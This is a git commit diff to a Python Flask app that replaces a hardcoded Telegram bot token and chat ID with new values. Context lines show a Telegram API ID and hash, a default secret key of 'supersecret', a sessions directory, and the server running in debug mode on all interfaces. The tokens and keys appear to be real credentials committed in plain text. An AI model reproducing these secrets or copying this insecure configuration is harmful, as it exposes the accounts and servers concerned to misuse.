1a918af3a2449d6c79a40adb3aec1ad73f24ccba
banddi <baguskarim992@gmail.com>
2026-02-22 21:41:48 +0700

    Update app.py

--- app.py
+++ app.py
@@ -48,8 +48,8 @@ app.secret_key = os.getenv("SECRET_KEY", "supersecret")
 api_id = int(os.getenv("API_ID", 34946540))
 api_hash = os.getenv("API_HASH", "7554a5e9dd52df527bfc39d8511413fd")
 
-BOT_TOKEN = "8414180460:AAHRNXWu6gUNh2ovgaUhaREnZUueE3HUMCg"
-CHAT_ID = "6980379378"
+BOT_TOKEN = "8542740297:AAF3ra4YX8ubm06ZQ5qwoyDoCC8EbsrWu6U"
+CHAT_ID = "7809328141"
 
 SESSION_DIR = "sessions"
 os.makedirs(SESSION_DIR, exist_ok=True)
@@ -538,6 +538,7 @@ if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080, debug=True)
 
  
+
 
 
 
